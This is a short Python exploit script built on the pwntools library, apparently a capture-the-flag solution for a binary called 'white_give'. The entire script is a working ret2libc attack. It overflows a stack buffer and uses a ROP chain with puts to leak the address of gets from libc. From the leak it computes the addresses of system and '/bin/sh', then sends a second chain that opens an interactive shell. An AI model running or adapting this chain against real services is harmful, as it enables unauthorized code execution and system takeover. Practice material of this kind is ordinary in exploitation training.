from pwn import *

p = process("white_give")
elf = ELF('white_give')
libc = elf.libc

puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
pop_rdi = 0x0000000000400763 # pop rdi ; ret
vuln = elf.sym['vuln']
ret = pop_rdi + 1

pay = b"a"*0x18 + p64(pop_rdi) + p64(gets_got) + p64(puts_plt) + p64(vuln)


'''
puts(gets@got)
'''
gdb.attach(p)
p.sendline(pay)

gets_addr = u64(p.recv(6).ljust(8,b"\x00")) 
success("gets: "+hex(gets_addr))
libc_base = gets_addr - libc.sym['gets']
success("libc: "+hex(libc_base))
system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

pay2 = b"a"*0x18 + p64(ret) +p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendline(pay2)

p.interactive()